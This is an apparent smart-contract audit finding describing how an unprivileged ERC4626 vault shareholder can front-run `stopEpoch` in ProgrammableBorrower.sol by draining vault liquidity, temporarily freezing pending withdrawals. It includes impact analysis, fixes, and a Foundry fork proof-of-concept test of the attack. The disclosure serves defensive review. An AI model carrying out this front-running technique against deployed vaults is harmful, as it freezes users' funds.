### Title
Unprivileged ERC4626 liquidity withdrawal can temporarily DoS `stopEpoch` and freeze pending withdrawals - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`IdleCDOEpochVariant.stopEpoch()` relies on `ProgrammableBorrower.onStopEpoch()` withdrawing the full pending-withdrawal amount from an external ERC4626 vault before epoch accounting can complete. [1](#0-0)  If the shares economically cover the request but current vault liquidity is insufficient, `vault.withdraw()` reverts and `onStopEpoch()` deliberately reverts with `StopEpochVaultLiquidityUnavailable`, rolling back the entire epoch stop. [2](#0-1) 

### Finding Description
During the buffer phase, `requestWithdraw()` burns the CDO's principal strategy tokens, mints a receipt to the user, and adds the claim to global `pendingWithdraws`. [3](#0-2)  When the epoch starts, `ProgrammableBorrower.onStartEpoch()` stores that obligation in `epochPendingWithdraws` but deposits the borrower's entire on-hand balance into the configured ERC4626 vault. [4](#0-3) 

After `epochEndDate`, the manager calls `stopEpoch()`, which reads `pendingWithdraws` and passes that amount to `ProgrammableBorrower.onStopEpoch()`. [5](#0-4)  The borrower checks coverage using `vault.convertToAssets(vault.balanceOf(address(this)))`, not currently withdrawable liquidity. [6](#0-5)  Consequently, an unprivileged shareholder of the configured ERC4626 vault can front-run `stopEpoch` and redeem enough of their own shares to consume the vault's currently available underlying liquidity; the programmable borrower's shares can still represent at least `shortfall` while the actual withdrawal fails because the remaining assets are allocated or illiquid. [2](#0-1) 

The failed external call is caught and converted into `StopEpochVaultLiquidityUnavailable`, so the manager's transaction reverts before `collectWithdrawFunds()`, `_updateAccounting()`, or receipt funding occurs. [7](#0-6)  The attacker can repeat the same action whenever enough liquidity reappears, keeping `pendingWithdraws` unfunded while retaining their withdrawn assets. [8](#0-7) 

### Impact Explanation
All `pendingWithdraws` are temporarily frozen for as long as the attacker can keep the ERC4626 vault's instant liquidity below the requested `shortfall`. [2](#0-1)  For `P = IdleCreditVault.pendingWithdraws()`, users cannot receive `P` underlying tokens and the epoch cannot settle until another `stopEpoch` succeeds. [9](#0-8) 

This does not directly steal funds or create borrower insolvency because `shortfall > _currentVaultAssets()` takes the separate default path instead. [10](#0-9)  The impact is nevertheless a quantified temporary freeze of `P` withdrawal funds, caused by an unprivileged actor changing external vault liquidity between transactions. [1](#0-0) 

### Likelihood Explanation
Likelihood depends on the configured vault being publicly redeemable or backed by markets whose instant liquidity can be reduced by ordinary users. [11](#0-10)  A large existing vault shareholder does not need any protocol role and only needs to front-run the manager's `stopEpoch` transaction; an underlying-market borrower can produce the same effect by borrowing the vault's available liquidity. [12](#0-11) 

The attack has an opportunity cost rather than a guaranteed profit because draining liquidity does not itself appropriate the programmable borrower's shares. [6](#0-5)  It is most feasible when pending withdrawals are large relative to the vault's immediately available liquidity, and less feasible when managers use private transaction submission or maintain an on-hand reserve. [13](#0-12) 

### Recommendation
Do not redeploy assets needed for known epoch-end obligations: in `onStartEpoch()`, keep at least `epochPendingWithdraws` as on-hand underlying and deposit only `balance - epochPendingWithdraws` into the ERC4626 vault. [4](#0-3)  For larger guaranteed settlement, retain `epochPendingWithdraws + expectedInterest` rather than relying on instant vault liquidity. [14](#0-13) 

Operationally, submit `stopEpoch` through private transaction channels and consider a persistent two-step recall that records successfully withdrawn liquidity before the final accounting call instead of rolling back every partial funding attempt. [8](#0-7)  A `maxWithdraw` preflight alone is insufficient because an attacker can remove the liquidity between that check and the subsequent withdrawal. [2](#0-1) 

### Proof of Concept
The following Foundry-fork PoC uses the deployed programmable-borrower vault and an unprivileged vault shareholder; it assumes a fork where the vault's immediate liquidity can be reduced below the pending withdrawal while `convertToAssets()` still reports enough share value. [15](#0-14) 

```solidity
function testStopEpochDosByDrainingExternalVaultLiquidity() external {
    // Existing fork setup: USDC underlying, MetaMorpho/ERC4626 vault,
    // owner/manager, cdoEpoch, aaTranche, strategy, programmableBorrower.
    _setUpProgrammableBorrowerCreditVault(FORK_BLOCK, address(programmableBorrower.vault()));

    IERC4626 externalVault = programmableBorrower.vault();
    address attacker = makeAddr("externalVaultShareholder");

    // The attacker is an ordinary ERC4626 user with a large position.
    uint256 attackerSeed = 10_000_000 * oneScale;
    deal(USDC, attacker, attackerSeed);
    vm.startPrank(attacker);
    IERC20Detailed(USDC).approve(address(externalVault), attackerSeed);
    externalVault.deposit(attackerSeed, attacker);
    vm.stopPrank();

    // Buffer phase: create a normal pending withdrawal receipt.
    uint256 amount = 10_000 * oneScale;
    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);
    idleCDO.depositAA(amount);
    uint256 requested = cdoEpoch.requestWithdraw(
        aaTranche.balanceOf(address(this)) / 2,
        address(aaTranche)
    );
    assertGt(requested, 0);

    // Running phase: programmable borrower parks idle principal in the vault.
    _startEpochAndCheckPrices(0);
    assertGt(externalVault.balanceOf(address(programmableBorrower)), 0);

    // Attacker front-runs stopEpoch and consumes currently available liquidity.
    vm.prank(attacker);
    externalVault.redeem(
        externalVault.balanceOf(attacker),
        attacker,
        attacker
    );

    uint256 pending = strategy.pendingWithdraws();
    assertGe(
        externalVault.convertToAssets(
            externalVault.balanceOf(address(programmableBorrower))
        ),
        pending,
        "shares remain economically sufficient"
    );

    // The external withdraw nevertheless lacks liquidity, so stopEpoch reverts.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertTrue(cdoEpoch.isEpochRunning());
    assertEq(strategy.pendingWithdraws(), pending);
    assertFalse(cdoEpoch.defaulted());
}
```

```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);

    epochDepositedToVault = 0;
```

```text
  function onStopEpoch(uint256 _amountRequired, bool _isRequestingAllFunds) external nonReentrant returns (bool success) {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // if we want to close the pool and the borrower still owes any amount, consider it a failure and let IdleCDO handle it as a default instead of a close. 
    if (_isRequestingAllFunds && (borrowerPrincipal != 0 || borrowerInterestDebt != 0 || borrowerInterestAccrued != 0)) {
      return false;
    }

    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.

      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
```
